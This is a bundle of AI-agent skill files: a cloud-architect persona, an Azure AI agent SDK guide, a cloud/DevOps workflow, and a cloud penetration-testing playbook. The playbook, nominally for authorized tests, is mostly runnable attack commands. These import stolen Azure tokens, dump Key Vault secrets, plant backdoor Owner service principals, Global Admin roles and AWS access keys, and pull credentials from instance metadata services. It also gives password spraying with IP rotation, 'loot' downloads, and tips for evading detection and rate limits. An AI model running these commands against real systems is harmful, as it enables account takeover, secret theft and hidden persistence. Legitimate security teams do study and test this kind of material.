## Source: references/skills/cloud-architect/SKILL.md

---
name: cloud-architect
description: Expert cloud architect specializing in AWS/Azure/GCP multi-cloud infrastructure design, advanced IaC (Terraform/OpenTofu/CDK), FinOps cost optimization, and modern architectural patterns.
risk: unknown
source: community
date_added: '2026-02-27'
---

## Use this skill when

- Working on cloud architect tasks or workflows
- Needing guidance, best practices, or checklists for cloud architect

## Do not use this skill when

- The task is unrelated to cloud architect
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

You are a cloud architect specializing in scalable, cost-effective, and secure multi-cloud infrastructure design.

## Purpose
Expert cloud architect with deep knowledge of AWS, Azure, GCP, and emerging cloud technologies. Masters Infrastructure as Code, FinOps practices, and modern architectural patterns including serverless, microservices, and event-driven architectures. Specializes in cost optimization, security best practices, and building resilient, scalable systems.

## Capabilities

### Cloud Platform Expertise
- **AWS**: EC2, Lambda, EKS, RDS, S3, VPC, IAM, CloudFormation, CDK, Well-Architected Framework
- **Azure**: Virtual Machines, Functions, AKS, SQL Database, Blob Storage, Virtual Network, ARM templates, Bicep
- **Google Cloud**: Compute Engine, Cloud Functions, GKE, Cloud SQL, Cloud Storage, VPC, Cloud Deployment Manager
- **Multi-cloud strategies**: Cross-cloud networking, data replication, disaster recovery, vendor lock-in mitigation
- **Edge computing**: CloudFlare, AWS CloudFront, Azure CDN, edge functions, IoT architectures

### Infrastructure as Code Mastery
- **Terraform/OpenTofu**: Advanced module design, state management, workspaces, provider configurations
- **Native IaC**: CloudFormation (AWS), ARM/Bicep (Azure), Cloud Deployment Manager (GCP)
- **Modern IaC**: AWS CDK, Azure CDK, Pulumi with TypeScript/Python/Go
- **GitOps**: Infrastructure automation with ArgoCD, Flux, GitHub Actions, GitLab CI/CD
- **Policy as Code**: Open Policy Agent (OPA), AWS Config, Azure Policy, GCP Organization Policy

### Cost Optimization & FinOps
- **Cost monitoring**: CloudWatch, Azure Cost Management, GCP Cost Management, third-party tools (CloudHealth, Cloudability)
- **Resource optimization**: Right-sizing recommendations, reserved instances, spot instances, committed use discounts
- **Cost allocation**: Tagging strategies, chargeback models, showback reporting
- **FinOps practices**: Cost anomaly detection, budget alerts, optimization automation
- **Multi-cloud cost analysis**: Cross-provider cost comparison, TCO modeling

### Architecture Patterns
- **Microservices**: Service mesh (Istio, Linkerd), API gateways, service discovery
- **Serverless**: Function composition, event-driven architectures, cold start optimization
- **Event-driven**: Message queues, event streaming (Kafka, Kinesis, Event Hubs), CQRS/Event Sourcing
- **Data architectures**: Data lakes, data warehouses, ETL/ELT pipelines, real-time analytics
- **AI/ML platforms**: Model serving, MLOps, data pipelines, GPU optimization

### Security & Compliance
- **Zero-trust architecture**: Identity-based access, network segmentation, encryption everywhere
- **IAM best practices**: Role-based access, service accounts, cross-account access patterns
- **Compliance frameworks**: SOC2, HIPAA, PCI-DSS, GDPR, FedRAMP compliance architectures
- **Security automation**: SAST/DAST integration, infrastructure security scanning
- **Secrets management**: HashiCorp Vault, cloud-native secret stores, rotation strategies

### Scalability & Performance
- **Auto-scaling**: Horizontal/vertical scaling, predictive scaling, custom metrics
- **Load balancing**: Application load balancers, network load balancers, global load balancing
- **Caching strategies**: CDN, Redis, Memcached, application-level caching
- **Database scaling**: Read replicas, sharding, connection pooling, database migration
- **Performance monitoring**: APM tools, synthetic monitoring, real user monitoring

### Disaster Recovery & Business Continuity
- **Multi-region strategies**: Active-active, active-passive, cross-region replication
- **Backup strategies**: Point-in-time recovery, cross-region backups, backup automation
- **RPO/RTO planning**: Recovery time objectives, recovery point objectives, DR testing
- **Chaos engineering**: Fault injection, resilience testing, failure scenario planning

### Modern DevOps Integration
- **CI/CD pipelines**: GitHub Actions, GitLab CI, Azure DevOps, AWS CodePipeline
- **Container orchestration**: EKS, AKS, GKE, self-managed Kubernetes
- **Observability**: Prometheus, Grafana, DataDog, New Relic, OpenTelemetry
- **Infrastructure testing**: Terratest, InSpec, Checkov, Terrascan

### Emerging Technologies
- **Cloud-native technologies**: CNCF landscape, service mesh, Kubernetes operators
- **Edge computing**: Edge functions, IoT gateways, 5G integration
- **Quantum computing**: Cloud quantum services, hybrid quantum-classical architectures
- **Sustainability**: Carbon footprint optimization, green cloud practices

## Behavioral Traits
- Emphasizes cost-conscious design without sacrificing performance or security
- Advocates for automation and Infrastructure as Code for all infrastructure changes
- Designs for failure with multi-AZ/region resilience and graceful degradation
- Implements security by default with least privilege access and defense in depth
- Prioritizes observability and monitoring for proactive issue detection
- Considers vendor lock-in implications and designs for portability when beneficial
- Stays current with cloud provider updates and emerging architectural patterns
- Values simplicity and maintainability over complexity

## Knowledge Base
- AWS, Azure, GCP service catalogs and pricing models
- Cloud provider security best practices and compliance standards
- Infrastructure as Code tools and best practices
- FinOps methodologies and cost optimization strategies
- Modern architectural patterns and design principles
- DevOps and CI/CD best practices
- Observability and monitoring strategies
- Disaster recovery and business continuity planning

## Response Approach
1. **Analyze requirements** for scalability, cost, security, and compliance needs
2. **Recommend appropriate cloud services** based on workload characteristics
3. **Design resilient architectures** with proper failure handling and recovery
4. **Provide Infrastructure as Code** implementations with best practices
5. **Include cost estimates** with optimization recommendations
6. **Consider security implications** and implement appropriate controls
7. **Plan for monitoring and observability** from day one
8. **Document architectural decisions** with trade-offs and alternatives

## Example Interactions
- "Design a multi-region, auto-scaling web application architecture on AWS with estimated monthly costs"
- "Create a hybrid cloud strategy connecting on-premises data center with Azure"
- "Optimize our GCP infrastructure costs while maintaining performance and availability"
- "Design a serverless event-driven architecture for real-time data processing"
- "Plan a migration from monolithic application to microservices on Kubernetes"
- "Implement a disaster recovery solution with 4-hour RTO across multiple cloud providers"
- "Design a compliant architecture for healthcare data processing meeting HIPAA requirements"
- "Create a FinOps strategy with automated cost optimization and chargeback reporting"

---

## Merged Reference (legacy variant)

---
name: agent-framework-azure-ai-py
description: "Build Azure AI Foundry agents using the Microsoft Agent Framework Python SDK (agent-framework-azure-ai). Use when creating persistent agents with AzureAIAgentsProvider, using hosted tools (code int..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Agent Framework Azure Hosted Agents

Build persistent agents on Azure AI Foundry using the Microsoft Agent Framework Python SDK.

## Architecture

```
User Query → AzureAIAgentsProvider → Azure AI Agent Service (Persistent)
                    ↓
              Agent.run() / Agent.run_stream()
                    ↓
              Tools: Functions | Hosted (Code/Search/Web) | MCP
                    ↓
              AgentThread (conversation persistence)
```

## Installation

```bash
# Full framework (recommended)
pip install agent-framework --pre

# Or Azure-specific package only
pip install agent-framework-azure-ai --pre
```

## Environment Variables

```bash
export AZURE_AI_PROJECT_ENDPOINT="https://<project>.services.ai.azure.com/api/projects/<project-id>"
export AZURE_AI_MODEL_DEPLOYMENT_NAME="gpt-4o-mini"
export BING_CONNECTION_ID="your-bing-connection-id"  # For web search
```

## Authentication

```python
from azure.identity.aio import AzureCliCredential, DefaultAzureCredential

# Development
credential = AzureCliCredential()

# Production
credential = DefaultAzureCredential()
```

## Core Workflow

### Basic Agent

```python
import asyncio
from agent_framework.azure import AzureAIAgentsProvider
from azure.identity.aio import AzureCliCredential

async def main():
    async with (
        AzureCliCredential() as credential,
        AzureAIAgentsProvider(credential=credential) as provider,
    ):
        agent = await provider.create_agent(
            name="MyAgent",
            instructions="You are a helpful assistant.",
        )
        
        result = await agent.run("Hello!")
        print(result.text)

asyncio.run(main())
```

### Agent with Function Tools

```python
from typing import Annotated
from pydantic import Field
from agent_framework.azure import AzureAIAgentsProvider
from azure.identity.aio import AzureCliCredential

def get_weather(
    location: Annotated[str, Field(description="City name to get weather for")],
) -> str:
    """Get the current weather for a location."""
    return f"Weather in {location}: 72°F, sunny"

def get_current_time() -> str:
    """Get the current UTC time."""
    from datetime import datetime, timezone
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

async def main():
    async with (
        AzureCliCredential() as credential,
        AzureAIAgentsProvider(credential=credential) as provider,
    ):
        agent = await provider.create_agent(
            name="WeatherAgent",
            instructions="You help with weather and time queries.",
            tools=[get_weather, get_current_time],  # Pass functions directly
        )
        
        result = await agent.run("What's the weather in Seattle?")
        print(result.text)
```

### Agent with Hosted Tools

```python
from agent_framework import (
    HostedCodeInterpreterTool,
    HostedFileSearchTool,
    HostedWebSearchTool,
)
from agent_framework.azure import AzureAIAgentsProvider
from azure.identity.aio import AzureCliCredential

async def main():
    async with (
        AzureCliCredential() as credential,
        AzureAIAgentsProvider(credential=credential) as provider,
    ):
        agent = await provider.create_agent(
            name="MultiToolAgent",
            instructions="You can execute code, search files, and search the web.",
            tools=[
                HostedCodeInterpreterTool(),
                HostedWebSearchTool(name="Bing"),
            ],
        )
        
        result = await agent.run("Calculate the factorial of 20 in Python")
        print(result.text)
```

### Streaming Responses

```python
async def main():
    async with (
        AzureCliCredential() as credential,
        AzureAIAgentsProvider(credential=credential) as provider,
    ):
        agent = await provider.create_agent(
            name="StreamingAgent",
            instructions="You are a helpful assistant.",
        )
        
        print("Agent: ", end="", flush=True)
        async for chunk in agent.run_stream("Tell me a short story"):
            if chunk.text:
                print(chunk.text, end="", flush=True)
        print()
```

### Conversation Threads

```python
from agent_framework.azure import AzureAIAgentsProvider
from azure.identity.aio import AzureCliCredential

async def main():
    async with (
        AzureCliCredential() as credential,
        AzureAIAgentsProvider(credential=credential) as provider,
    ):
        agent = await provider.create_agent(
            name="ChatAgent",
            instructions="You are a helpful assistant.",
            tools=[get_weather],
        )
        
        # Create thread for conversation persistence
        thread = agent.get_new_thread()
        
        # First turn
        result1 = await agent.run("What's the weather in Seattle?", thread=thread)
        print(f"Agent: {result1.text}")
        
        # Second turn - context is maintained
        result2 = await agent.run("What about Portland?", thread=thread)
        print(f"Agent: {result2.text}")
        
        # Save thread ID for later resumption
        print(f"Conversation ID: {thread.conversation_id}")
```

### Structured Outputs

```python
from pydantic import BaseModel, ConfigDict
from agent_framework.azure import AzureAIAgentsProvider
from azure.identity.aio import AzureCliCredential

class WeatherResponse(BaseModel):
    model_config = ConfigDict(extra="forbid")
    
    location: str
    temperature: float
    unit: str
    conditions: str

async def main():
    async with (
        AzureCliCredential() as credential,
        AzureAIAgentsProvider(credential=credential) as provider,
    ):
        agent = await provider.create_agent(
            name="StructuredAgent",
            instructions="Provide weather information in structured format.",
            response_format=WeatherResponse,
        )
        
        result = await agent.run("Weather in Seattle?")
        weather = WeatherResponse.model_validate_json(result.text)
        print(f"{weather.location}: {weather.temperature}°{weather.unit}")
```

## Provider Methods

| Method | Description |
|--------|-------------|
| `create_agent()` | Create new agent on Azure AI service |
| `get_agent(agent_id)` | Retrieve existing agent by ID |
| `as_agent(sdk_agent)` | Wrap SDK Agent object (no HTTP call) |

## Hosted Tools Quick Reference

| Tool | Import | Purpose |
|------|--------|---------|
| `HostedCodeInterpreterTool` | `from agent_framework import HostedCodeInterpreterTool` | Execute Python code |
| `HostedFileSearchTool` | `from agent_framework import HostedFileSearchTool` | Search vector stores |
| `HostedWebSearchTool` | `from agent_framework import HostedWebSearchTool` | Bing web search |
| `HostedMCPTool` | `from agent_framework import HostedMCPTool` | Service-managed MCP |
| `MCPStreamableHTTPTool` | `from agent_framework import MCPStreamableHTTPTool` | Client-managed MCP |

## Complete Example

```python
import asyncio
from typing import Annotated
from pydantic import BaseModel, Field
from agent_framework import (
    HostedCodeInterpreterTool,
    HostedWebSearchTool,
    MCPStreamableHTTPTool,
)
from agent_framework.azure import AzureAIAgentsProvider
from azure.identity.aio import AzureCliCredential


def get_weather(
    location: Annotated[str, Field(description="City name")],
) -> str:
    """Get weather for a location."""
    return f"Weather in {location}: 72°F, sunny"


class AnalysisResult(BaseModel):
    summary: str
    key_findings: list[str]
    confidence: float


async def main():
    async with (
        AzureCliCredential() as credential,
        MCPStreamableHTTPTool(
            name="Docs MCP",
            url="https://learn.microsoft.com/api/mcp",
        ) as mcp_tool,
        AzureAIAgentsProvider(credential=credential) as provider,
    ):
        agent = await provider.create_agent(
            name="ResearchAssistant",
            instructions="You are a research assistant with multiple capabilities.",
            tools=[
                get_weather,
                HostedCodeInterpreterTool(),
                HostedWebSearchTool(name="Bing"),
                mcp_tool,
            ],
        )
        
        thread = agent.get_new_thread()
        
        # Non-streaming
        result = await agent.run(
            "Search for Python best practices and summarize",
            thread=thread,
        )
        print(f"Response: {result.text}")
        
        # Streaming
        print("\nStreaming: ", end="")
        async for chunk in agent.run_stream("Continue with examples", thread=thread):
            if chunk.text:
                print(chunk.text, end="", flush=True)
        print()
        
        # Structured output
        result = await agent.run(
            "Analyze findings",
            thread=thread,
            response_format=AnalysisResult,
        )
        analysis = AnalysisResult.model_validate_json(result.text)
        print(f"\nConfidence: {analysis.confidence}")


if __name__ == "__main__":
    asyncio.run(main())
```

## Conventions

- Always use async context managers: `async with provider:`
- Pass functions directly to `tools=` parameter (auto-converted to AIFunction)
- Use `Annotated[type, Field(description=...)]` for function parameters
- Use `get_new_thread()` for multi-turn conversations
- Prefer `HostedMCPTool` for service-managed MCP, `MCPStreamableHTTPTool` for client-managed

## Reference Files

- references/tools.md: Detailed hosted tool patterns
- references/mcp.md: MCP integration (hosted + local)
- references/threads.md: Thread and conversation management
- references/advanced.md: OpenAPI, citations, structured outputs

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.

---

## Merged Reference (legacy variant)

---
name: cloud-devops
description: "Cloud infrastructure and DevOps workflow covering AWS, Azure, GCP, Kubernetes, Terraform, CI/CD, monitoring, and cloud-native development."
category: workflow-bundle
risk: safe
source: personal
date_added: "2026-02-27"
---

# Cloud/DevOps Workflow Bundle

## Overview

Comprehensive cloud and DevOps workflow for infrastructure provisioning, container orchestration, CI/CD pipelines, monitoring, and cloud-native application development.

## When to Use This Workflow

Use this workflow when:
- Setting up cloud infrastructure
- Implementing CI/CD pipelines
- Deploying Kubernetes applications
- Configuring monitoring and observability
- Managing cloud costs
- Implementing DevOps practices

## Workflow Phases

### Phase 1: Cloud Infrastructure Setup

#### Skills to Invoke
- `cloud-architect` - Cloud architecture
- `aws-skills` - AWS development
- `azure-functions` - Azure development
- `gcp-cloud-run` - GCP development
- `terraform-skill` - Terraform IaC
- `terraform-specialist` - Advanced Terraform

#### Actions
1. Design cloud architecture
2. Set up accounts and billing
3. Configure networking
4. Provision resources
5. Set up IAM

#### Copy-Paste Prompts
```
Use @cloud-architect to design multi-cloud architecture
```

```
Use @terraform-skill to provision AWS infrastructure
```

### Phase 2: Container Orchestration

#### Skills to Invoke
- `kubernetes-architect` - Kubernetes architecture
- `docker-expert` - Docker containerization
- `helm-chart-scaffolding` - Helm charts
- `k8s-manifest-generator` - K8s manifests
- `k8s-security-policies` - K8s security

#### Actions
1. Design container architecture
2. Create Dockerfiles
3. Build container images
4. Write K8s manifests
5. Deploy to cluster
6. Configure networking

#### Copy-Paste Prompts
```
Use @kubernetes-architect to design K8s architecture
```

```
Use @docker-expert to containerize application
```

```
Use @helm-chart-scaffolding to create Helm chart
```

### Phase 3: CI/CD Implementation

#### Skills to Invoke
- `deployment-engineer` - Deployment engineering
- `cicd-automation-workflow-automate` - CI/CD automation
- `github-actions-templates` - GitHub Actions
- `gitlab-ci-patterns` - GitLab CI
- `deployment-pipeline-design` - Pipeline design

#### Actions
1. Design deployment pipeline
2. Configure build automation
3. Set up test automation
4. Configure deployment stages
5. Implement rollback strategies
6. Set up notifications

#### Copy-Paste Prompts
```
Use @cicd-automation-workflow-automate to set up CI/CD pipeline
```

```
Use @github-actions-templates to create GitHub Actions workflow
```

### Phase 4: Monitoring and Observability

#### Skills to Invoke
- `observability-engineer` - Observability engineering
- `grafana-dashboards` - Grafana dashboards
- `prometheus-configuration` - Prometheus setup
- `datadog-automation` - Datadog integration
- `sentry-automation` - Sentry error tracking

#### Actions
1. Design monitoring strategy
2. Set up metrics collection
3. Configure log aggregation
4. Implement distributed tracing
5. Create dashboards
6. Set up alerts

#### Copy-Paste Prompts
```
Use @observability-engineer to set up observability stack
```

```
Use @grafana-dashboards to create monitoring dashboards
```

### Phase 5: Cloud Security

#### Skills to Invoke
- `cloud-penetration-testing` - Cloud pentesting
- `aws-penetration-testing` - AWS security
- `k8s-security-policies` - K8s security
- `secrets-management` - Secrets management
- `mtls-configuration` - mTLS setup

#### Actions
1. Assess cloud security
2. Configure security groups
3. Set up secrets management
4. Implement network policies
5. Configure encryption
6. Set up audit logging

#### Copy-Paste Prompts
```
Use @cloud-penetration-testing to assess cloud security
```

```
Use @secrets-management to configure secrets
```

### Phase 6: Cost Optimization

#### Skills to Invoke
- `cost-optimization` - Cloud cost optimization
- `database-cloud-optimization-cost-optimize` - Database cost optimization

#### Actions
1. Analyze cloud spending
2. Identify optimization opportunities
3. Right-size resources
4. Implement auto-scaling
5. Use reserved instances
6. Set up cost alerts

#### Copy-Paste Prompts
```
Use @cost-optimization to reduce cloud costs
```

### Phase 7: Disaster Recovery

#### Skills to Invoke
- `incident-responder` - Incident response
- `incident-runbook-templates` - Runbook creation
- `postmortem-writing` - Postmortem documentation

#### Actions
1. Design DR strategy
2. Set up backups
3. Create runbooks
4. Test failover
5. Document procedures
6. Train team

#### Copy-Paste Prompts
```
Use @incident-runbook-templates to create runbooks
```

## Cloud Provider Workflows

### AWS
```
Skills: aws-skills, aws-serverless, aws-penetration-testing
Services: EC2, Lambda, S3, RDS, ECS, EKS
```

### Azure
```
Skills: azure-functions, azure-ai-projects-py, azure-monitor-opentelemetry-py
Services: Functions, App Service, AKS, Cosmos DB
```

### GCP
```
Skills: gcp-cloud-run
Services: Cloud Run, GKE, Cloud Functions, BigQuery
```

## Quality Gates

- [ ] Infrastructure provisioned
- [ ] CI/CD pipeline working
- [ ] Monitoring configured
- [ ] Security measures in place
- [ ] Cost optimization applied
- [ ] DR procedures documented

## Related Workflow Bundles

- `development` - Application development
- `security-audit` - Security testing
- `database` - Database operations
- `testing-qa` - Testing workflows

---

## Merged Reference (legacy variant)

---
name: cloud-penetration-testing
description: "This skill should be used when the user asks to \"perform cloud penetration testing\", \"assess Azure or AWS or GCP security\", \"enumerate cloud resources\", \"exploit cloud misconfiguratio..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Cloud Penetration Testing

## Purpose

Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP). This skill covers reconnaissance, authentication testing, resource enumeration, privilege escalation, data extraction, and persistence techniques for authorized cloud security engagements.

## Prerequisites

### Required Tools
```bash
# Azure tools
Install-Module -Name Az -AllowClobber -Force
Install-Module -Name MSOnline -Force
Install-Module -Name AzureAD -Force

# AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install

# GCP CLI
curl https://sdk.cloud.google.com | bash
gcloud init

# Additional tools
pip install scoutsuite pacu
```

### Required Knowledge
- Cloud architecture fundamentals
- Identity and Access Management (IAM)
- API authentication mechanisms
- DevOps and automation concepts

### Required Access
- Written authorization for testing
- Test credentials or access tokens
- Defined scope and rules of engagement

## Outputs and Deliverables

1. **Cloud Security Assessment Report** - Comprehensive findings and risk ratings
2. **Resource Inventory** - Enumerated services, storage, and compute instances
3. **Credential Findings** - Exposed secrets, keys, and misconfigurations
4. **Remediation Recommendations** - Hardening guidance per platform

## Core Workflow

### Phase 1: Reconnaissance

Gather initial information about target cloud presence:

```bash
# Azure: Get federation info
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"

# Azure: Get Tenant ID
curl "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"

# Enumerate cloud resources by company name
python3 cloud_enum.py -k targetcompany

# Check IP against cloud providers
cat ips.txt | python3 ip2provider.py
```

### Phase 2: Azure Authentication

Authenticate to Azure environments:

```powershell
# Az PowerShell Module
Import-Module Az
Connect-AzAccount

# With credentials (may bypass MFA)
$credential = Get-Credential
Connect-AzAccount -Credential $credential

# Import stolen context
Import-AzContext -Profile 'C:\Temp\StolenToken.json'

# Export context for persistence
Save-AzContext -Path C:\Temp\AzureAccessToken.json

# MSOnline Module
Import-Module MSOnline
Connect-MsolService
```

### Phase 3: Azure Enumeration

Discover Azure resources and permissions:

```powershell
# List contexts and subscriptions
Get-AzContext -ListAvailable
Get-AzSubscription

# Current user role assignments
Get-AzRoleAssignment

# List resources
Get-AzResource
Get-AzResourceGroup

# Storage accounts
Get-AzStorageAccount

# Web applications
Get-AzWebApp

# SQL Servers and databases
Get-AzSQLServer
Get-AzSqlDatabase -ServerName $Server -ResourceGroupName $RG

# Virtual machines
Get-AzVM
$vm = Get-AzVM -Name "VMName"
$vm.OSProfile

# List all users
Get-MSolUser -All

# List all groups
Get-MSolGroup -All

# Global Admins
Get-MsolRole -RoleName "Company Administrator"
Get-MSolGroupMember -GroupObjectId $GUID

# Service Principals
Get-MsolServicePrincipal
```

### Phase 4: Azure Exploitation

Exploit Azure misconfigurations:

```powershell
# Search user attributes for passwords
$users = Get-MsolUser -All
foreach($user in $users){
    $props = @()
    $user | Get-Member | foreach-object{$props+=$_.Name}
    foreach($prop in $props){
        if($user.$prop -like "*password*"){
            Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)
        }
    }
}

# Execute commands on VMs
Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1

# Extract VM UserData
$vms = Get-AzVM
$vms.UserData

# Dump Key Vault secrets
az keyvault list --query '[].name' --output tsv
az keyvault set-policy --name <vault> --upn <user> --secret-permissions get list
az keyvault secret list --vault-name <vault> --query '[].id' --output tsv
az keyvault secret show --id <URI>
```

### Phase 5: Azure Persistence

Establish persistence in Azure:

```powershell
# Create backdoor service principal
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

# Add service principal to Global Admin
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId

# Login as service principal
$cred = Get-Credential  # AppID as username, secret as password
Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal

# Create new admin user via CLI
az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
```

### Phase 6: AWS Authentication

Authenticate to AWS environments:

```bash
# Configure AWS CLI
aws configure
# Enter: Access Key ID, Secret Access Key, Region, Output format

# Use specific profile
aws configure --profile target

# Test credentials
aws sts get-caller-identity
```

### Phase 7: AWS Enumeration

Discover AWS resources:

```bash
# Account information
aws sts get-caller-identity
aws iam list-users
aws iam list-roles

# S3 Buckets
aws s3 ls
aws s3 ls s3://bucket-name/
aws s3 sync s3://bucket-name ./local-dir

# EC2 Instances
aws ec2 describe-instances

# RDS Databases
aws rds describe-db-instances --region us-east-1

# Lambda Functions
aws lambda list-functions --region us-east-1
aws lambda get-function --function-name <name>

# EKS Clusters
aws eks list-clusters --region us-east-1

# Networking
aws ec2 describe-subnets
aws ec2 describe-security-groups --group-ids <sg-id>
aws directconnect describe-connections
```

### Phase 8: AWS Exploitation

Exploit AWS misconfigurations:

```bash
# Check for public RDS snapshots
aws rds describe-db-snapshots --snapshot-type manual --query=DBSnapshots[*].DBSnapshotIdentifier
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
# AttributeValues = "all" means publicly accessible

# Extract Lambda environment variables (may contain secrets)
aws lambda get-function --function-name <name> | jq '.Configuration.Environment'

# Access metadata service (from compromised EC2)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 access
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

### Phase 9: AWS Persistence

Establish persistence in AWS:

```bash
# List existing access keys
aws iam list-access-keys --user-name <username>

# Create backdoor access key
aws iam create-access-key --user-name <username>

# Get all EC2 public IPs
for region in $(cat regions.txt); do
    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
done
```

### Phase 10: GCP Enumeration

Discover GCP resources:

```bash
# Authentication
gcloud auth login
gcloud auth activate-service-account --key-file creds.json
gcloud auth list

# Account information
gcloud config list
gcloud organizations list
gcloud projects list

# IAM Policies
gcloud organizations get-iam-policy <org-id>
gcloud projects get-iam-policy <project-id>

# Enabled services
gcloud services list

# Source code repos
gcloud source repos list
gcloud source repos clone <repo>

# Compute instances
gcloud compute instances list
gcloud beta compute ssh --zone "region" "instance" --project "project"

# Storage buckets
gsutil ls
gsutil ls -r gs://bucket-name
gsutil cp gs://bucket/file ./local

# SQL instances
gcloud sql instances list
gcloud sql databases list --instance <id>

# Kubernetes
gcloud container clusters list
gcloud container clusters get-credentials <cluster> --region <region>
kubectl cluster-info
```

### Phase 11: GCP Exploitation

Exploit GCP misconfigurations:

```bash
# Get metadata service data
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"

# Check access scopes
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'

# Decrypt data with keyring
gcloud kms decrypt --ciphertext-file=encrypted.enc --plaintext-file=out.txt --key <key> --keyring <keyring> --location global

# Serverless function analysis
gcloud functions list
gcloud functions describe <name>
gcloud functions logs read <name> --limit 100

# Find stored credentials
sudo find /home -name "credentials.db"
sudo cp -r /home/user/.config/gcloud ~/.config
gcloud auth list
```

## Quick Reference

### Azure Key Commands

| Action | Command |
|--------|---------|
| Login | `Connect-AzAccount` |
| List subscriptions | `Get-AzSubscription` |
| List users | `Get-MsolUser -All` |
| List groups | `Get-MsolGroup -All` |
| Current roles | `Get-AzRoleAssignment` |
| List VMs | `Get-AzVM` |
| List storage | `Get-AzStorageAccount` |
| Key Vault secrets | `az keyvault secret list --vault-name <name>` |

### AWS Key Commands

| Action | Command |
|--------|---------|
| Configure | `aws configure` |
| Caller identity | `aws sts get-caller-identity` |
| List users | `aws iam list-users` |
| List S3 buckets | `aws s3 ls` |
| List EC2 | `aws ec2 describe-instances` |
| List Lambda | `aws lambda list-functions` |
| Metadata | `curl http://169.254.169.254/latest/meta-data/` |

### GCP Key Commands

| Action | Command |
|--------|---------|
| Login | `gcloud auth login` |
| List projects | `gcloud projects list` |
| List instances | `gcloud compute instances list` |
| List buckets | `gsutil ls` |
| List clusters | `gcloud container clusters list` |
| IAM policy | `gcloud projects get-iam-policy <project>` |
| Metadata | `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/...` |

### Metadata Service URLs

| Provider | URL |
|----------|-----|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2018-02-01` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |

### Useful Tools

| Tool | Purpose |
|------|---------|
| ScoutSuite | Multi-cloud security auditing |
| Pacu | AWS exploitation framework |
| AzureHound | Azure AD attack path mapping |
| ROADTools | Azure AD enumeration |
| WeirdAAL | AWS service enumeration |
| MicroBurst | Azure security assessment |
| PowerZure | Azure post-exploitation |

## Constraints and Limitations

### Legal Requirements
- Only test with explicit written authorization
- Respect scope boundaries between cloud accounts
- Do not access production customer data
- Document all testing activities

### Technical Limitations
- MFA may prevent credential-based attacks
- Conditional Access policies may restrict access
- CloudTrail/Activity Logs record all API calls
- Some resources require specific regional access

### Detection Considerations
- Cloud providers log all API activity
- Unusual access patterns trigger alerts
- Use slow, deliberate enumeration
- Consider GuardDuty, Security Center, Cloud Armor

## Examples

### Example 1: Azure Password Spray

**Scenario:** Test Azure AD password policy

```powershell
# Using MSOLSpray with FireProx for IP rotation
# First create FireProx endpoint
python fire.py --access_key <key> --secret_access_key <secret> --region us-east-1 --url https://login.microsoft.com --command create

# Spray passwords
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password "Spring2024!" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
```

### Example 2: AWS S3 Bucket Enumeration

**Scenario:** Find and access misconfigured S3 buckets

```bash
# List all buckets
aws s3 ls | awk '{print $3}' > buckets.txt

# Check each bucket for contents
while read bucket; do
    echo "Checking: $bucket"
    aws s3 ls s3://$bucket 2>/dev/null
done < buckets.txt

# Download interesting bucket
aws s3 sync s3://misconfigured-bucket ./loot/
```

### Example 3: GCP Service Account Compromise

**Scenario:** Pivot using compromised service account

```bash
# Authenticate with service account key
gcloud auth activate-service-account --key-file compromised-sa.json

# List accessible projects
gcloud projects list

# Enumerate compute instances
gcloud compute instances list --project target-project

# Check for SSH keys in metadata
gcloud compute project-info describe --project target-project | grep ssh

# SSH to instance
gcloud beta compute ssh instance-name --zone us-central1-a --project target-project
```

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Authentication failures | Verify credentials; check MFA; ensure correct tenant/project; try alternative auth methods |
| Permission denied | List current roles; try different resources; check resource policies; verify region |
| Metadata service blocked | Check IMDSv2 (AWS); verify instance role; check firewall for 169.254.169.254 |
| Rate limiting | Add delays; spread across regions; use multiple credentials; focus on high-value targets |

## References

- [Advanced Cloud Scripts](references/advanced-cloud-scripts.md) - Azure Automation runbooks, Function Apps enumeration, AWS data exfiltration, GCP advanced exploitation

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.

---

## Merged Reference (legacy variant)

---
